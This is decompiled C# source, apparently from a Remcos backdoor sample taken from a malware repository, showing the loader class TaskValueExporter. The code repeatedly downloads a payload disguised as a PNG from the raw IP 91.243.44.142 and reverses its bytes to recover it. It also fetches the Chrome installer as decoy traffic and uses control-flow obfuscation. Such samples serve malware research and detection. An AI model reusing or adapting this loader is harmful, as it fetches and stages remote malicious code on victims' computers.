// Decompiled with JetBrains decompiler
// Type: Otsvixv.TaskValueExporter
// Assembly: Htrfwkj, Version=10.0.14393.0, Culture=neutral, PublicKeyToken=null
// MVID: 515AD638-AF99-4E13-90D9-A5E7D6BF4EA3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Backdoor.Win32.Remcos.ucy-9a9c931a412df86ea65b5228c9237d2e5e2199715858d8b4ae1caec6d5702131.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Otsvixv
{
  internal class TaskValueExporter
  {
    private static TaskValueExporter SortPublisher;

    [SpecialName]
    internal byte[] ReflectWrapper()
    {
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 1:
            num = \u003CModule\u003E\u007B4729abbb\u002D01c2\u002D4a4d\u002Db2f0\u002D7fae13219cc9\u007D.m_8604852082a54c7c89286315f798e4cb.m_0a52ef1c03a34e2b952404e1ad75ff2d != 0 ? 0 : 0;
            continue;
          default:
            goto label_2;
        }
      }
label_2:
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      byte[] numArray = (byte[]) null;
      this.NewWrapper();
      while (numArray == null)
      {
        try
        {
          byte[] collection = new BinaryReader(WebRequest.Create("http://91.243.44.142/pl-Htrfwkj.png").GetResponse().GetResponseStream()).ReadBytes(89041980);
          List<byte> byteList = new List<byte>();
          byteList.AddRange((IEnumerable<byte>) collection);
          byteList.Reverse();
          numArray = byteList.ToArray();
        }
        catch
        {
          numArray = (byte[]) null;
        }
      }
      return numArray;
    }

    internal void NewWrapper()
    {
      for (int index = 0; index < 2; ++index)
      {
        try
        {
          int num1 = 0;
          Stream stream = (Stream) null;
          MemoryStream memoryStream = (MemoryStream) null;
          WebResponse webResponse = (WebResponse) null;
          try
          {
            WebRequest webRequest = (WebRequest) TaskValueExporter.SelectPublisher((object) "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BC90A50E2-9663-721F-0CA2-5F40A838AEA0%7D%26lang%3Den%26browser%3D4%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe");
            if (webRequest != null)
            {
              webResponse = webRequest.GetResponse();
              int num2 = 0;
              if (\u003CModule\u003E\u007B4729abbb\u002D01c2\u002D4a4d\u002Db2f0\u002D7fae13219cc9\u007D.m_8604852082a54c7c89286315f798e4cb.m_35b1c8ee5bce45df8ce58f4805c6d479 != 0)
                goto label_5;
label_3:
              switch (num2)
              {
                default:
                  if (webResponse != null)
                  {
                    stream = webResponse.GetResponseStream();
                    memoryStream = new MemoryStream();
                    byte[] buffer = new byte[1024];
                    int count;
                    do
                    {
                      count = stream.Read(buffer, 0, buffer.Length);
                      memoryStream.Write(buffer, 0, count);
                      num1 += count;
                    }
                    while (count > 0);
                  }
                  continue;
              }
label_5:
              num2 = 0;
              goto label_3;
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.Message);
          }
          finally
          {
            webResponse?.Close();
            stream?.Close();
            bool flag = memoryStream != null;
            int num3 = 0;
            if (\u003CModule\u003E\u007B4729abbb\u002D01c2\u002D4a4d\u002Db2f0\u002D7fae13219cc9\u007D.m_8604852082a54c7c89286315f798e4cb.m_5fb128ab07ff4028bc9a7b1b8b8fd948 == 0)
              goto label_20;
label_12:
            switch (num3)
            {
              default:
                if (flag)
                  goto label_18;
label_15:
                GC.Collect();
label_18:
                memoryStream.Close();
                goto label_15;
            }
label_20:
            num3 = 0;
            goto label_12;
          }
        }
        catch
        {
        }
      }
      GC.Collect();
    }

    internal static bool LogoutPublisher() => TaskValueExporter.SortPublisher == null;

    internal static TaskValueExporter PopPublisher() => TaskValueExporter.SortPublisher;

    internal static object SelectPublisher([In] object obj0) => (object) WebRequest.Create((string) obj0);
  }
}
